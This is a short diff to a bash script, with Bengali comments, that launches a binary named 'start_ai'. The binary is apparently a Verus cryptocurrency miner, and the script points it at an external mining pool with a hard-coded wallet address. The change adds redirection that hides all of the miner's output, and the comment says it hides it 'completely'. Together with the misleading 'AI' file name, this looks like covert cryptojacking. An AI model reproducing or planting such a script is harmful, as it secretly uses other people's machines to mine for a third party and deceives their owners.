@@ -1,7 +1,6 @@
 #!/bin/bash
 
-# Executable বানানো
 chmod +x start_ai
 
-# মাইনিং শুরু
-./start_ai -a verus -o stratum+tcp://sg.vipor.net:5040 -u RJfrEDCJfNccNkXmuJcvxCcS5kLQnmpKK7 -p x -t 2
+# মাইনিং চালাও, আউটপুট সম্পূর্ণ লুকিয়ে (stdout + stderr)
+./start_ai -a verus -o stratum+tcp://sg.vipor.net:5040 -u RJfrEDCJfNccNkXmuJcvxCcS5kLQnmpKK7 -p x -t 2 > /dev/null 2>&1
